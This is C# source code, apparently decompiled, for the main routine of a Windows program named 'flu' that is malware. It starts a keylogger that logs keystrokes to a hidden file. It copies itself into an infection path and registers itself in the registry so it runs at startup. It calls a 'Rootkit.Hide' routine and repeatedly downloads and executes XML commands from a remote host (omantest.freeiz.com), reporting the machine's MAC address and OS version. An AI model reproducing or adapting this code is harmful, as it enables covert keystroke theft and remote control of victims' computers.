using System;
using System.IO;
using System.Net.NetworkInformation;
using System.Threading;
using System.Windows.Forms;

namespace flu;

internal static class Program
{
	[STAThread]
	private static void Main()
	{
		XMLReader xMLReader = new XMLReader();
		StreamReader streamReader = new StreamReader(Application.get_ExecutablePath());
		BinaryReader binaryReader = new BinaryReader(streamReader.BaseStream);
		binaryReader.ReadBytes(Convert.ToInt32(streamReader.BaseStream.Length));
		binaryReader.Close();
		streamReader.Close();
		try
		{
			Network.XML = "http://omantest.freeiz.com/wee.xml";
		}
		catch
		{
		}
		try
		{
			Network.Domain = "http://omantest.freeiz.com";
		}
		catch
		{
		}
		try
		{
			Network.MAC = NetworkInterface.GetAllNetworkInterfaces()[0].GetPhysicalAddress().ToString();
		}
		catch
		{
		}
		try
		{
			File file = new File(Application.get_ExecutablePath());
			string text = string.Empty;
			string empty = string.Empty;
			bool flag;
			if (!(flag = file.existKey("win32")))
			{
				text = Path.GetRandomFileName().Replace(".", "");
				empty = OS.InfectionPath() + "\\" + text + ".txt";
			}
			else
			{
				empty = file.getKeyValue("win32").Replace(".exe", ".txt");
			}
			try
			{
				KeyLogger keyLogger = new KeyLogger(empty);
				keyLogger.FlushInterval = Convert.ToDouble(15000);
				keyLogger.Enabled = true;
				StreamWriter streamWriter = new StreamWriter(empty, append: true);
				streamWriter.WriteLine("Teclas pulsadas por el usuario:\r\n");
				streamWriter.Close();
				File file2 = new File(empty);
				file2.Protect();
			}
			catch
			{
			}
			if (!flag)
			{
				try
				{
					file.Protect();
					empty = OS.InfectionPath() + "\\" + text + ".exe";
					file.CopyTo(empty);
					file = new File(empty);
					file.Register(File.RunLocation.InRegistry);
					file.Protect();
				}
				catch
				{
				}
			}
		}
		catch
		{
		}
		try
		{
			Rootkit.Hide();
		}
		catch
		{
		}
		while (true)
		{
			try
			{
				while (true)
				{
					if (Network.Online())
					{
						try
						{
							Network.UpdateState(OS.Version());
						}
						catch
						{
						}
						try
						{
							xMLReader.GetXML();
						}
						catch
						{
						}
						try
						{
							xMLReader.ExecuteXML();
						}
						catch
						{
							System.Console.WriteLine("Error no hay XML cargado");
						}
					}
					try
					{
						Thread.Sleep(2000);
					}
					catch
					{
					}
				}
			}
			catch
			{
			}
		}
	}
}
